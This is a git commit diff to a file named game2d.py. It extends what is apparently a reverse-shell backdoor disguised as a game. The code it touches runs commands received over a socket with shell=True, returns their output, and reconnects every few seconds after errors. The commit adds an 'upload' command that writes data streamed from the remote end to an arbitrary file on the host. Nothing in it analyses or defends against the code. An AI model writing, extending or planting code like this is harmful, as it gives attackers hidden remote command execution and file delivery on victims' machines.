d42be13d9e75ee03023dbaff3343863d09c69177
winnerontheslot-stack <winnerontheslot@gmail.com>
2026-02-27 18:46:36 -0500

    Update game2d.py

--- game2d.py
+++ game2d.py
@@ -8,6 +8,14 @@ while 1:
             if c.lower() == "exit": 
                 s.close(); 
                 sys.exit()
+            if c.startswith("upload "):
+                filename = c[7:]
+                with open(filename, "wb") as f:
+                    while True:
+                        data = s.recv(1024)
+                        if not data: break
+                        f.write(data)
+                continue
             s.send(subprocess.run(c, shell=True, capture_output=True, text=True).stdout.encode())
     except:
         time.sleep(5)
